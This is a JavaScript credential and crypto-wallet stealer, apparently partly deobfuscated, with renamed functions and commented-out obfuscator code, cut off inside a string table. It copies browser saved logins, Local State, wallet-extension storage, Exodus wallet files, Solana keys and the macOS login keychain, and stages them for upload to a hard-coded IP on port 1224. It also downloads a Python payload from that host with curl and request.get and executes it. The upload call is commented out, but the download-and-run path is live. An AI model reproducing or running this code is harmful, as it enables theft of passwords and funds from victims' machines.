// (function (_0x2f994d, _0x5b0569) {
//   const _0x5c1f78 = _0x2f994d();
//   while (true) {
//     try {
//       const _0x3cd119 = -parseInt(_0x2b47(597, 0x48f)) / 1 * (-parseInt(_0x2b47(648, '0x103')) / 2) + parseInt(_0x2b47(339, '0x4af')) / 3 + -parseInt(_0x2b47(304, '0x3e9')) / 4 * (-parseInt(_0x2b47(626, 0x24b)) / 5) + parseInt(_0x2b47(569, '0x200')) / 6 * (parseInt(_0x2b47(707, '0x170')) / 7) + -parseInt(_0x2b47(274, 0xa4)) / 8 * (parseInt(_0x2b47(259, 0x449)) / 9) + -parseInt(_0x2b47(685, 0x537)) / 10 * (-parseInt(_0x2b47(429, '0x432')) / 11) + -parseInt(_0x2b47(497, 0x492)) / 12;
//       if (_0x3cd119 === _0x5b0569) {
//         break;
//       } else {
//         _0x5c1f78.push(_0x5c1f78.shift());
//       }
//     } catch (_0x140320) {
//       _0x5c1f78.push(_0x5c1f78.shift());
//     }
//   }
// })(_0x8ee0, 198776);
// console.log('done while');

// const _0x20c5af = function () {
//   let _0xcd3dfe = true;
//   return function (_0x933753, _0x5bca30) {
//     const _0x5301ec = _0xcd3dfe ? function () {
//       if (_0x5bca30) {
//         const _0x3b2bc3 = _0x5bca30.apply(_0x933753, arguments);
//         _0x5bca30 = null;
//         return _0x3b2bc3;
//       }
//     } : function () {};
//     _0xcd3dfe = false;
//     return _0x5301ec;
//   };
// }();
// const _0x2f8e71 = _0x20c5af(this, function () {
//   return _0x2f8e71.toString().search("(((.+)+)+)+$").toString().constructor(_0x2f8e71).search("(((.+)+)+)+$");
// });
// // _0x2f8e71();
// console.log("debug");
// const _0x20ca48 = function () {
//   let _0x2a46bf = true;
//   return function (_0x495fc9, _0x5954a0) {
//     const _0x1ae42f = _0x2a46bf ? function () {
//       if (_0x5954a0) {
//         const _0x4906db = _0x5954a0.apply(_0x495fc9, arguments);
//         _0x5954a0 = null;
//         return _0x4906db;
//       }
//     } : function () {};
//     _0x2a46bf = false;
//     return _0x1ae42f;
//   };
// }();

// (function () {
//   let _0x57a35a;
//   try {
//     const _0x240eba = Function("return (function() {}.constructor(\"return this\")( ));");
//     _0x57a35a = _0x240eba();
//   } catch (_0x170855) {
//     _0x57a35a = window;
//   }
//   _0x57a35a.setInterval(_0x7734c2, 4000);
// })();
// (function () {
//   _0x20ca48(this, function () {
//     const _0x3119c6 = new RegExp("function *\\( *\\)");
//     const _0x3c382c = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", 'i');
//     const _0x29a69b = _0x7734c2("init");
//     if (!_0x3119c6.test(_0x29a69b + "chain") || !_0x3c382c.test(_0x29a69b + "input")) {
//       _0x29a69b('0');
//     } else {
//       _0x7734c2();
//     }
//   })();
// })();
// const _0xf8debd = function () {
//   let _0x469af1 = true;
//   return function (_0x5dfae9, _0x2f630) {
//     const _0x88f5b4 = _0x469af1 ? function () {
//       if (_0x2f630) {
//         const _0x244fe8 = _0x2f630.apply(_0x5dfae9, arguments);
//         _0x2f630 = null;
//         return _0x244fe8;
//       }
//     } : function () {};
//     _0x469af1 = false;
//     return _0x88f5b4;
//   };
// }();
// const _0x372bd4 = _0xf8debd(this, function () {
//   const _0xe6b485 = function () {
//     let _0xc571a4;
//     try {
//       _0xc571a4 = Function("return (function() {}.constructor(\"return this\")( ));")();
//     } catch (_0x2b230b) {
//       _0xc571a4 = window;
//     }
//     return _0xc571a4;
//   };
//   const _0xa8c0f6 = _0xe6b485();
//   const _0x3d7c49 = _0xa8c0f6.console = _0xa8c0f6.console || {};
//   const _0x4f3bef = ["log", "warn", "info", "error", "exception", "table", "trace"];
//   for (let _0x3b6d44 = 0; _0x3b6d44 < _0x4f3bef.length; _0x3b6d44++) {
//     const _0x45b205 = _0xf8debd.constructor.prototype.bind(_0xf8debd);
//     const _0x782a8f = _0x4f3bef[_0x3b6d44];
//     const _0x8cd357 = _0x3d7c49[_0x782a8f] || _0x45b205;
//     _0x45b205.__proto__ = _0xf8debd.bind(_0xf8debd);
//     _0x45b205.toString = _0x8cd357.toString.bind(_0x8cd357);
//     _0x3d7c49[_0x782a8f] = _0x45b205;
//   }
// });
// _0x372bd4();

const fs = require("fs");
const os = require("os");
const path = require("path");
const request = require("request");
const childProcessExec = require("child_process").exec;
const hostname = os.hostname();
// const platform = os.platform();
const platform = "linux";
const homeDir = os.homedir();
const tmpDir = os.tmpdir();
const fsPromises = require("fs/promises");

const normalizeHomeDir = (path) => {
  return path.replace(/^~([a-z]+|\/)/, (match, p) => {
    return "/" === p ? homeDir : path.dirname(homeDir) + "/" + p;
  });
};

// function _0x1267be(_0x21d87b, _0x34b58e, _0x36e757, _0x5ad490, _0x33dfb7) {
//   return _0x2b47(_0x21d87b + 0x18c, _0x34b58e);
// }

function haveAccessTo(path) {
  try {
    fs.accessSync(path);
    return true;
  } catch (e) {
    return false;
  }
}

// function _0x26a3a8(_0x41d764, _0x4213c1, _0x53b944, _0x2f5edb, _0x9a6f8c) {
//   return _0x2b47(_0x4213c1 + 0x48, _0x53b944);
// }

// 0 = windows | 1 = macOS | 2 = linux
const bravePaths = [
  "Local/BraveSoftware/Brave-Browser",
  "BraveSoftware/Brave-Browser",
  "BraveSoftware/Brave-Browser",
];
const chromePaths = ["Local/Google/Chrome", "Google/Chrome", "google-chrome"];
const operaPaths = [
  "Roaming/Opera Software/Opera Stable",
  "com.operasoftware.Opera",
  "opera",
];
const randomStrings = [
  "nkbihfbeogaeaoehlefnkodbefgpgknn",
  "ejbalbakoplchlghecdalmeeeajnimhm",
  "fhbohimaelbohpjbbldcngcnapndodjp",
  "ibnejdfjmmkpcnlpebklmnkoeoihofec",
  "bfnaelmomeimhlpmgjnjophhpkkoljpa",
  "aeachknmefphepccionboohckonoeemg",
  "hifafgmccdpekplomjjkcfgodnhcellj",
  "jblndlipeogpafnldhgmapagcccfchpi",
  "acmacodkjbdgmoleebolmdjonilkdbch",
  "dlcobpjiigpikoobohmabehhmhfoodbb",
  "mcohilncbfahbmgdjkbpemcciiolgcge",
  "agoakfejjabomempkjlepdflaleeobhb",
  "omaabbefbmiijedngplfjmnooppbclkk",
  "aholpfdialjgjfhomihkjbmgjidlcdno",
  "nphplpgoakhhjchkkhmiggakijnkhfnd",
  "penjlddjkjgpnkllboccdgccekpkcbin",
  "lgmpcpglpngdoalbgeoldeajfclnhafa",
  "fldfpgipfncgndfolcbkdeeknbbbnhcc",
  "bhhhlbepdkbapadjdnnojkbgioiodbic",
  "gjnckgkfmgmibbkoficdidcljeaaaheg",
  "afbcbjpbpfadlkmhmclhkeeodmamcflc",
];

const getBrowserExtensionDataAndSolanaConfigThenSendToServer = async (
  browserDataPath,
  segmentServerFilename,
  isChrome,
  currentUnixTimestamp
) => {
  const _0x292f9d = {
    kxZWZ: function (_0x338d24, _0x5deb2e) {
      return _0x338d24 >= _0x5deb2e;
    },
    ICQig: "PeByP",
    VyiOO: "Default",
    nzsEp: "upeqG",
  };

  _0x292f9d.CpDEs = "XpWkM";

  let solanaConfigPath;

  if (!browserDataPath || "" === browserDataPath) {
    return [];
  }

  // try {
  //   if (!haveAccessTo(browserDataPath)) {
  //     return [];
  //   }
  // } catch (e) {
  //   return [];
  // }

  if (!segmentServerFilename) {
    segmentServerFilename = "";
  }

  let filesToSend = [];

  for (let iteration = 0; iteration < 200; iteration++) {
    const extensionSettingsPath =
      browserDataPath +
      "/" +
      (0 === iteration ? "Default" : "Profile " + iteration) +
      "/Local Extension Settings";

    for (
      let randomStringIteration = 0;
      randomStringIteration < randomStrings.length;
      randomStringIteration++
    ) {
      let extensionSettingWithRandomStringPath =
        extensionSettingsPath + "/" + randomStrings[randomStringIteration];
      console.log(extensionSettingWithRandomStringPath);

      // if (haveAccessTo(extensionSettingWithRandomStringPath)) {
      // if ("upeqG" !== _0x292f9d.CpDEs) {
      //   let extensionSettingFilePaths = [];
      //   try {
      //     extensionSettingFilePaths = fs.readdirSync(
      //       extensionSettingWithRandomStringPath
      //     );
      //   } catch (_0x5503b9) {
      //     extensionSettingFilePaths = [];
      //   }

      //   let _0x56eee7 = 0;

      //   if (!haveAccessTo(normalizeHomeDir("~/") + "/.n3")) {
      //     fsPromises.mkdir(normalizeHomeDir("~/") + "/.n3");
      //   }

      //   extensionSettingFilePaths.forEach(async (extensionSettingFilePath) => {
      //     let extensionSettingFullPath = path.join(
      //       extensionSettingWithRandomStringPath,
      //       extensionSettingFilePath
      //     );
      //     try {
      //       let fileStat = fs.statSync(extensionSettingFullPath);

      //       if (fileStat.isDirectory()) {
      //         return;
      //       }

      //       if (
      //         extensionSettingFullPath.includes(".log") ||
      //         extensionSettingFullPath.includes(".ldb")
      //       ) {
      //         const _0x3a05cf = {
      //           filename:
      //             "726_" +
      //             segmentServerFilename +
      //             iteration +
      //             "_" +
      //             randomStrings[randomStringIteration] +
      //             "_" +
      //             extensionSettingFilePath,
      //         };
      //         filesToSend.push({
      //           value: fs.createReadStream(extensionSettingFullPath),
      //           options: _0x3a05cf,
      //         });
      //       } else {
      //         fsPromises.copyFile(
      //           extensionSettingFullPath,
      //           normalizeHomeDir("~/") + "/.n3/tp" + _0x56eee7
      //         );
      //         const _0x1a0fc4 = {
      //           filename:
      //             "726_" +
      //             segmentServerFilename +
      //             iteration +
      //             "_" +
      //             randomStrings[randomStringIteration] +
      //             "_" +
      //             extensionSettingFilePath,
      //         };
      //         filesToSend.push({
      //           value: fs.createReadStream(
      //             normalizeHomeDir("~/") + "/.n3/tp" + _0x56eee7
      //           ),
      //           options: _0x1a0fc4,
      //         });
      //         _0x56eee7 += 1;
      //       }
      //     } catch (_0x16740b) {}
      //   });
      // } else {
      //   _0x3582e9 = [];
      // }
      // }
    }
  }

  // if (
  //   isChrome &&
  //   ((solanaConfigPath = homeDir + "/.config/solana/id.json"),
  //   fs.existsSync(solanaConfigPath))
  // ) {
  //   try {
  //     const _0x403590 = {
  //       filename: "solana_id.txt",
  //     };
  //     filesToSend.push({
  //       value: fs.createReadStream(solanaConfigPath),
  //       options: _0x403590,
  //     });
  //   } catch (e) {}
  // }

  // sendToServer(filesToSend, currentUnixTimestamp);

  return filesToSend;
};

const getFirefoxProfileDataAndSendToServer = (_0x528188) => {
  const profilePath =
    normalizeHomeDir("~/") + "/AppData/Roaming/Mozilla/Firefox/Profiles";
  let filesToSend = [];
  if (haveAccessTo(profilePath)) {
    let profileFiles = [];

    try {
      profileFiles = fs.readdirSync(profilePath);
    } catch (e) {
      profileFiles = [];
    }

    let _0x15e105 = 0;

    profileFiles.forEach(async (profileFile) => {
      let profileFilePath = path.join(profilePath, profileFile);

      if (profileFilePath.includes("-release")) {
        let storagePath = path.join(profileFilePath, "/storage/default");
        let storageFiles = [];

        storageFiles = fs.readdirSync(storagePath);

        let _0x567869 = 0;

        storageFiles.forEach(async (storageFile) => {
          if (storageFile.includes("moz-extension")) {
            let storageFilePath = path.join(storagePath, storageFile);
            storageFilePath = path.join(storageFilePath, "idb");

            let _0x306cde = [];

            _0x306cde = fs.readdirSync(storageFilePath);

            _0x306cde.forEach(async (_0x1d30fe) => {
              if (_0x1d30fe.includes(".files")) {
                let _0x1bb168 = path.join(storageFilePath, _0x1d30fe);
                let _0x458ce4 = [];
                _0x458ce4 = fs.readdirSync(_0x1bb168);

                _0x458ce4.forEach((_0x3c9b18) => {
                  if (
                    !fs.statSync(path.join(_0x1bb168, _0x3c9b18)).isDirectory()
                  ) {
                    let _0x21d0b0 = path.join(_0x1bb168, _0x3c9b18);
                    const _0x183bde = {
                      filename: _0x15e105 + "_" + _0x567869 + "_" + _0x3c9b18,
                    };
                    filesToSend.push({
                      value: fs.createReadStream(_0x21d0b0),
                      options: _0x183bde,
                    });
                  }
                });
              }
            });
          }
        });
        _0x567869 += 1;
      }
      _0x15e105 += 1;
    });

    sendToServer(filesToSend, _0x528188);

    return filesToSend;
  }
};

const getExodusWalletFilesAndSendToServer = (currentUnixTimestamp) => {
  let exodusWalletDirPath = "";
  let files = [];

  if ("w" == platform[0]) {
    // windows
    exodusWalletDirPath =
      normalizeHomeDir("~/") + "/AppData/Roaming/Exodus/exodus.wallet";
  } else if ("d" == platform[0]) {
    // mac os
    exodusWalletDirPath =
      normalizeHomeDir("~/") + "/Library/Application Support/eoxdus.wallet";
  } else {
    // any, linux
    exodusWalletDirPath =
      normalizeHomeDir("~/") + "/.config/Exodus/exodus.wallet";
  }

  if (haveAccessTo(exodusWalletDirPath)) {
    let exodusWalletFiles = [];
    try {
      exodusWalletFiles = fs.readdirSync(exodusWalletDirPath);
    } catch (_0x12b31d) {
      exodusWalletFiles = [];
    }
    let fileIteration = 0;
    if (!haveAccessTo(normalizeHomeDir("~/") + "/.n3")) {
      fsPromises.mkdir(normalizeHomeDir("~/") + "/.n3");
    }
    exodusWalletFiles.forEach(async (filePath) => {
      let exodusAbsoluteFilePath = path.join(exodusWalletDirPath, filePath);
      try {
        fsPromises.copyFile(
          exodusAbsoluteFilePath,
          normalizeHomeDir("~/") + "/.n3/tp" + fileIteration
        );
        const _0x1f74c5 = {
          filename: "726_" + filePath,
        };
        files.push({
          value: fs.createReadStream(
            normalizeHomeDir("~/") + "/.n3/tp" + fileIteration
          ),
          options: _0x1f74c5,
        });
        fileIteration += 1;
      } catch (e) {}
    });
  }

  sendToServer(files, currentUnixTimestamp);

  return files;
};

const sendToServer = (_0x3c1e09, currentUnixTimestamp) => {
  const formData = {
    type: "3",
    hid: "726_" + hostname,
    uts: currentUnixTimestamp,
    multi_file: _0x3c1e09,
  };
  try {
    if (_0x3c1e09.length > 0) {
      const payload = {
        url: "http://45.89.53.59:1224/uploads",
        formData: formData,
      };
      console.log("send to server", payload);

      // request.post(payload, (_0x5f043a, _0x454f2b, _0x10a6a0) => {});
    }
  } catch (e) {}
};

const sendBrowserConfigToServer = async (
  browserPaths,
  num,
  currentUnixTimestamp
) => {
  try {
    let browserDataPath = "";

    browserDataPath =
      "d" == platform[0]
        ? normalizeHomeDir("~/") +
          "/Library/Application Support/" +
          browserPaths[1]
        : "l" == platform[0]
        ? normalizeHomeDir("~/") + "/.config/" + browserPaths[2]
        : normalizeHomeDir("~/") + "/AppData/" + browserPaths[0] + "/User Data";

    console.log(browserDataPath);

    // await getBrowserExtensionDataAndSolanaConfigThenSendToServer(
    //   browserDataPath,
    //   num + "_",
    //   0 == num,
    //   currentUnixTimestamp
    // );
  } catch (e) {}
};

const getMacOsLoginKeyChainAndBrowserProfile = async (currentUnixTimestamp) => {
  let files = [];
  let loginKeychainPath = homeDir + "/Library/Keychains/login.keychain";

  if (fs.existsSync(loginKeychainPath)) {
    try {
      const _0x516578 = {
        filename: "logkc-db",
      };
      files.push({
        value: fs.createReadStream(loginKeychainPath),
        options: _0x516578,
      });
    } catch (e) {}
  } else {
    loginKeychainPath += "-db";
    if (fs.existsSync(loginKeychainPath)) {
      try {
        const _0x4c9239 = {
          filename: "logkc-db",
        };
        files.push({
          value: fs.createReadStream(loginKeychainPath),
          options: _0x4c9239,
        });
      } catch (e) {}
    }
  }

  try {
    let chromePath = homeDir + "/Library/Application Support/Google/Chrome";
    if (haveAccessTo(chromePath)) {
      for (let iterationCount = 0; iterationCount < 200; iterationCount++) {
        const loginDataPath =
          chromePath +
          "/" +
          (0 === iterationCount ? "Default" : "Profile " + iterationCount) +
          "/Login Data";
        try {
          if (!haveAccessTo(loginDataPath)) {
            continue;
          }
          const _0xc17712 = chromePath + "/ld_" + iterationCount;
          const _0x4ab57f = {
            filename: "pld_" + iterationCount,
          };
          if (haveAccessTo(_0xc17712)) {
            files.push({
              value: fs.createReadStream(_0xc17712),
              options: _0x4ab57f,
            });
          } else {
            fs.copyFile(loginDataPath, _0xc17712, (_0x573ee4) => {
              const _0x4a1277 = {
                filename: "pld_" + iterationCount,
              };
              let _0xc397b9 = [
                {
                  value: fs.createReadStream(loginDataPath),
                  options: _0x4a1277,
                },
              ];
              sendToServer(_0xc397b9, currentUnixTimestamp);
            });
          }
        } catch (_0x176fa5) {}
      }
    }
  } catch (e) {}

  try {
    let bravePath =
      homeDir + "/Library/Application Support/BraveSoftware/Brave-Browser";
    if (haveAccessTo(bravePath)) {
      for (let _0x1ad1a6 = 0; _0x1ad1a6 < 200; _0x1ad1a6++) {
        const _0x24b6a7 =
          bravePath +
          "/" +
          (0 === _0x1ad1a6 ? "Default" : "Profile " + _0x1ad1a6);
        try {
          if (!haveAccessTo(_0x24b6a7)) {
            continue;
          }
          const _0x1a3147 = _0x24b6a7 + "/Login Data";
          const _0x5bcd6d = {
            filename: "brld_" + _0x1ad1a6,
          };
          if (haveAccessTo(_0x1a3147)) {
            files.push({
              value: fs.createReadStream(_0x1a3147),
              options: _0x5bcd6d,
            });
          } else {
            fs.copyFile(_0x24b6a7, _0x1a3147, (_0x122861) => {
              const _0x17e36b = {
                filename: "brld_" + _0x1ad1a6,
              };
              let _0x497785 = [
                {
                  value: fs.createReadStream(_0x24b6a7),
                  options: _0x17e36b,
                },
              ];
              sendToServer(_0x497785, currentUnixTimestamp);
            });
          }
        } catch (_0x3e6e3e) {}
      }
    }
  } catch (e) {}

  sendToServer(files, currentUnixTimestamp);

  return files;
};

const getBrowserLocalStateAndLoginDataThanSendToServer = async (
  browserPaths,
  num,
  currentUnixTimestamp
) => {
  let files = [];
  let browserUserDataPath = "";

  browserUserDataPath =
    "d" == platform[0]
      ? normalizeHomeDir("~/") +
        "/Library/Application Support/" +
        browserPaths[1]
      : "l" == platform[0]
      ? normalizeHomeDir("~/") + "/.config/" + browserPaths[2]
      : normalizeHomeDir("~/") + "/AppData/" + browserPaths[0] + "/User Data";

  // const chromePaths = ["Local/Google/Chrome", "Google/Chrome", "google-chrome"];

  // const bravePaths = [
  //   "Local/BraveSoftware/Brave-Browser",
  //   "BraveSoftware/Brave-Browser",
  //   "BraveSoftware/Brave-Browser",
  // ];

  // const operaPaths = [
  //   "Roaming/Opera Software/Opera Stable",
  //   "com.operasoftware.Opera",
  //   "opera",
  // ];
  let browserLocalStatePath = browserUserDataPath + "/Local State";

  if (fs.existsSync(browserLocalStatePath)) {
    try {
      const _0x331066 = {
        filename: num + "_lst",
      };
      files.push({
        value: fs.createReadStream(browserLocalStatePath),
        options: _0x331066,
      });
    } catch (e) {}
  }

  try {
    if (haveAccessTo(browserUserDataPath)) {
      for (let iteration = 0; iteration < 200; iteration++) {
        const profilePath =
          browserUserDataPath +
          "/" +
          (0 === iteration ? "Default" : "Profile " + iteration);

        try {
          if (!haveAccessTo(profilePath)) {
            continue;
          }

          const loginDataPath = profilePath + "/Login Data";

          if (!haveAccessTo(loginDataPath)) {
            continue;
          }

          const _0xb66962 = {
            filename: num + "_" + iteration + "_uld",
          };

          files.push({
            value: fs.createReadStream(loginDataPath),
            options: _0xb66962,
          });
        } catch (e) {}
      }
    }
  } catch (e) {}

  sendToServer(files, currentUnixTimestamp);

  return files;
};

// function _0x2c9ab1(_0x19580f, _0x682088, _0x4655c5, _0x2f0de4, _0x771c85) {
//   return _0x2b47(_0x4655c5 - "0x264", _0x771c85);
// }

let pythonArchiveFileSize = 0;

const extractArchiveFile = async (filePath) => {
  childProcessExec(
    "tar -xf " + filePath + " -C " + homeDir,
    (err, stdout, stderr) => {
      if (err) {
        fs.rmSync(filePath);
        return void (pythonArchiveFileSize = 0);
      }
      fs.rmSync(filePath);
      downloadAndExecPythonMalware();
    }
  );
};

const installPython = () => {
  const pythonArchiveFile1 = tmpDir + "\\p.zi";
  const pythonArchiveFile2 = tmpDir + "\\p2.zip";

  if (pythonArchiveFileSize >= 51476596) {
    return;
  }

  if (fs.existsSync(pythonArchiveFile1)) {
    try {
      var pythonArchiveFile1Stat = fs.statSync(pythonArchiveFile1);
      if (pythonArchiveFile1Stat.size >= 51476596) {
        pythonArchiveFileSize = pythonArchiveFile1Stat.size;
        fs.rename(pythonArchiveFile1, pythonArchiveFile2, (err) => {
          if (err) {
            throw err;
          }
          extractArchiveFile(pythonArchiveFile2);
        });
      } else {
        if (pythonArchiveFileSize < pythonArchiveFile1Stat.size) {
          pythonArchiveFileSize = pythonArchiveFile1Stat.size;
        } else {
          fs.rmSync(pythonArchiveFile1);
          pythonArchiveFileSize = 0;
        }
        installPythonIn20Second();
      }
    } catch (e) {}
  } else {
    childProcessExec(
      'curl -Lo "' +
        pythonArchiveFile1 +
        '" "' +
        "http://45.89.53.59:1224/pdown" +
        '"',
      (err, stdout, stderr) => {
        if (err) {
          pythonArchiveFileSize = 0;
          return void installPythonIn20Second();
        }
        try {
          pythonArchiveFileSize = 51476596;
          fs.renameSync(pythonArchiveFile1, pythonArchiveFile2);
          extractArchiveFile(pythonArchiveFile2);
        } catch (e) {}
      }
    );
  }
};

function installPythonIn20Second() {
  setTimeout(() => {
    installPython();
  }, 20000);
}

const downloadAndExecPythonMalware = async () =>
  await new Promise((resolve, reject) => {
    if ("w" == platform[0]) {
      if (fs.existsSync(homeDir + "\\.pyp\\python.exe")) {
        (() => {
          const nplPath = homeDir + "/.npl";
          const commandToExecNplFile =
            '"' + homeDir + '\\.pyp\\python.exe" "' + nplPath + '"';

          try {
            fs.rmSync(nplPath);
          } catch (e) {}

          request.get(
            "http://45.89.53.59:1224/client/3/726",
            (err, response, body) => {
              if (!err) {
                try {
                  fs.writeFileSync(nplPath, body);
                  childProcessExec(
                    commandToExecNplFile,
                    (err, stdout, stderr) => {}
                  );
                } catch (e) {}
              }
            }
          );
        })();
      } else {
        installPython();
      }
    } else {
      (() => {
        request.get(
          "http://45.89.53.59:1224/client/3/726",
          (err, response, body) => {
            if (!err) {
              fs.writeFileSync(homeDir + "/.npl", body);
              childProcessExec(
                'python3 "' + homeDir + '/.npl"',
                (err, stdout, stderr) => {}
              );
            }
          }
        );
      })();
    }
  });

// function _0x18efaf(_0x43a3ff, _0x22b142, _0x2306fd, _0x24f609, _0x160de8) {
//   return _0x2b47(_0x22b142 + 181, _0x24f609);
// }

// function _0x1408a1(_0x5a9813, _0xf0356b, _0x195b3a, _0x5a0681, _0x48f421) {
//   return _0x2b47(_0x48f421 + 0x32b, _0x195b3a);
// }

// function getKeywords() {
//   const _0x57f0de = [
//     "ng/Op",
//     "gipfn",
//     "gdoal",
//     "Googl",
//     "ngplf",
//     "post",
//     "/AppD",
//     "ame",
//     "pglpn",
//     "while",
//     "zlGMX",
//     ".ldb",
//     "ort/e",
//     "stedH",
//     "ing",
//     "0-9a-",
//     "Brows",
//     "formD",
//     "lengt",
//     "ata/",
//     "bXIZW",
//     "sSync",
//     "error",
//     "oficd",
//     "ajnim",
//     "ofile",
//     "EDfVr",
//     "fumVd",
//     "CvcJe",
//     "emcci",
//     "\\p.zi",
//     "BvCJj",
//     "dgcce",
//     "NvxZt",
//     "wuqYc",
//     "pikoo",
//     "lipeo",
//     "knmef",
//     "befbm",
//     "oihof",
//     "VyiOO",
//     "omise",
//     "state",
//     "adlkm",
//     "n() ",
//     "Local",
//     "GpLzt",
//     "Softw",
//     "write",
//     "Data",
//     "mgjnj",
//     "test",
//     "oQLiA",
//     "fs/pr",
//     '-Lo "',
//     "869eempSC",
//     "NRICf",
//     "eycha",
//     "eRtPh",
//     "oohck",
//     "nzsEp",
//     "pndod",
//     "LTxKM",
//     "a_id.",
//     "keych",
//     "tmpdi",
//     "iknBw",
//     "fekmr",
//     "/Loca",
//     "vyOlg",
//     "_lst",
//     "pebkl",
//     "excep",
//     "hfood",
//     "terva",
//     "/uplo",
//     "re/Br",
//     "bhaAH",
//     "xodus",
//     "le/Ch",
//     ")+)+)",
//     "us.wa",
//     "oamin",
//     "oOvSH",
//     "platf",
//     "ocal/",
//     "ain",
//     "omjjk",
//     "g/Moz",
//     "aeaoe",
//     "gger",
//     "urrPg",
//     "ejbal",
//     "g/Exo",
//     "jnkhf",
//     "are/B",
//     "bapad",
//     "nYhyz",
//     "lchlg",
//     "rowse",
//     "cionb",
//     " (tru",
//     "ary/K",
//     "rcOpo",
//     "re/Op",
//     "mdjon",
//     "FileS",
//     "readd",
//     "warn",
//     "pplic",
//     "n Dat",
//     "AgFoY",
//     "//45.",
//     "retur",
//     "efaul",
//     "\\pyth",
//     "gmccd",
//     "rmSyn",
//     "get",
//     "eebol",
//     "rn th",
//     "renam",
//     "homed",
//     "6922764RoJKqG",
//     "apagc",
//     "gpafn",
//     "pld_",
//     "lBcQc",
//     "clnha",
//     "acces",
//     "nkbih",
//     "ion *",
//     "mnkoe",
//     "creat",
//     "fig/",
//     "statS",
//     "ins/l",
//     "ahbmg",
//     "rome",
//     "nhcel",
//     "RnISq",
//     "idb",
//     "jdnno",
//     "UinqR",
//     "le ",
//     "grNeZ",
//     "ync",
//     "wFOZV",
//     "ort/G",
//     "bgeol",
//     "moz-e",
//     "searc",
//     "\\+\\+ ",
//     "gjnck",
//     "curl ",
//     "ICQig",
//     "XUhmL",
//     "ccfch",
//     "mibbk",
//     "ation",
//     "lquOc",
//     "ogin.",
//     "kpcnl",
//     "/Goog",
//     "to__",
//     "log",
//     "phTfF",
//     "getTi",
//     "llet",
//     "/Libr",
//     "bakop",
//     "Edge/",
//     "repla",
//     "dus/e",
//     "pdfla",
//     ".file",
//     "YPJIO",
//     "exist",
//     "push",
//     "eSoft",
//     "xf ",
//     "pkjle",
//     "lbocc",
//     "ware/",
//     "CpDEs",
//     "jpbpf",
//     "LRqRV",
//     "/Brav",
//     "table",
//     "soft/",
//     "fig/E",
//     "zA-Z_",
//     "nXIOu",
//     "des",
//     "OWuKf",
//     "6qBfDAK",
//     "\\.pyp",
//     "reque",
//     "pgoak",
//     "actio",
//     "Profi",
//     "JPaFS",
//     "idclj",
//     "/Logi",
//     "cgndf",
//     "url",
//     "/.n3/",
//     "ata/L",
//     "PeByP",
//     " Data",
//     ".log",
//     "ggaki",
//     "FqSwM",
//     "orm",
//     "ata/R",
//     "odkjb",
//     "com.o",
//     "ckFAA",
//     "User ",
//     "dfjmm",
//     "ensio",
//     "fdial",
//     "xVhCN",
//     "6UcOLxc",
//     "irSyn",
//     "logkc",
//     "eaaah",
//     "olana",
//     "__pro",
//     "a-zA-",
//     "n (fu",
//     "-db",
//     "eSync",
//     "kOABy",
//     "ess",
//     "kodbe",
//     "xPZNj",
//     "Defau",
//     "-rele",
//     "oftwa",
//     'e" "',
//     "googl",
//     "age/d",
//     "kpkcb",
//     "gkfmg",
//     "gabAj",
//     "89.53",
//     "apply",
//     "debu",
//     "YCuMb",
//     "fejja",
//     "cReEh",
//     "5gxDkTW",
//     "EdxBb",
//     "-Brow",
//     "jkbgi",
//     "QBgOS",
//     "orTVM",
//     "lmome",
//     "ads",
//     "n Set",
//     "TQTdC",
//     "_file",
//     "fgpgk",
//     "acmac",
//     "fhboh",
//     "mcohi",
//     "\\( *\\",
//     "round",
//     "trace",
//     "QoBSq",
//     "ppbcl",
//     "Brave",
//     "join",
//     "66772KSxbWi",
//     "ngcna",
//     "HBtvF",
//     '"retu',
//     "toStr",
//     "count",
//     "DkIvk",
//     "phepc",
//     "/exod",
//     "bhhhl",
//     "ort/",
//     "bbbnh",
//     "lmeee",
//     "mCOST",
//     "hlefn",
//     "/pdow",
//     "olcbk",
//     "l Sta",
//     "ary/A",
//     "oiodb",
//     " -C ",
//     "http:",
//     "piegd",
//     "exec",
//     "jmnoo",
//     "$]*)",
//     "bind",
//     "nstru",
//     "on.ex",
//     "hifaf",
//     "aholp",
//     "bomem",
//     "AtFLv",
//     "tion",
//     "/stor",
//     "iolgc",
//     "agoak",
//     "41110DnynzZ",
//     "ctor(",
//     "ort/B",
//     "init",
//     "upeqG",
//     "leeob",
//     "_uld",
//     "omihk",
//     "idlcd",
//     "ion",
//     "opera",
//     "e/Chr",
//     "raveS",
//     "lncbf",
//     "/ld_",
//     "eRead",
//     "CpVQk",
//     "XpWkM",
//     "hostn",
//     "DXOxT",
//     "/.con",
//     "ibnej",
//     "2157827TDuqyB",
//     "fqcgS",
//     "afbcb",
//     "dBPSt",
//     "setIn",
//     "kkhmi",
//     "224",
//     'n3 "',
//     "\\p2.z",
//     "/.npl",
//     "forEa",
//     "conso",
//     "child",
//     "(((.+",
//     "mkdir",
//     "dMskA",
//     "Objec",
//     "keeod",
//     "dNTDu",
//     "/.n3",
//     "dlcob",
//     "pekpl",
//     "pytho",
//     "solan",
//     "mamcf",
//     "/id.j",
//     "cfgod",
//     "hid",
//     "fldfp",
//     "djkbp",
//     "*(?:[",
//     " Supp",
//     "penjl",
//     "/clie",
//     "brld_",
//     "uts",
//     "fbeog",
//     "bfnae",
//     "iTQEP",
//     "era S",
//     "RBcYe",
//     "_proc",
//     "WQtdq",
//     "SYrgU",
//     "tings",
//     "99OiHHkR",
//     "qlBKa",
//     "Cvsrd",
//     "bbldc",
//     "ldhgm",
//     "pjiig",
//     "peras",
//     "dgmol",
//     "onoee",
//     "imael",
//     "ddjkj",
//     "SlKKc",
//     "HdztH",
//     "proto",
//     "ser",
//     "283576FekOgz",
//     "ase",
//     "aeach",
//     '" "',
//     "path",
//     "ophhp",
//     "isDir",
//     "ufdFW",
//     "gpnkl",
//     "RJkxX",
//     "nctio",
//     "vXTGs",
//     "txt",
//     "chain",
//     "ructo",
//     "wXTVP",
//     "e) {}",
//     "ector",
//     "yKKRN",
//     "hhjch",
//     "nphpl",
//     "input",
//     "YNndp",
//     "tar -",
//     "rBBKY",
//     "lOPUu",
//     "ave-B",
//     "deajf",
//     "jJYWj",
//     "Z_$][",
//     "866672ruEcys",
//     ".59:1",
//     "omaab",
//     "re.Op",
//     "726",
//     "type",
//     "xtens",
//     "snONW",
//     "illa/",
//     "iijed",
//     "rave-",
//     "Firef",
//     "nt/",
//     "Roami",
//     "info",
//     "const",
//     "copyF",
//     'is")(',
//     ".wall",
//     "size",
//     "hLPHg",
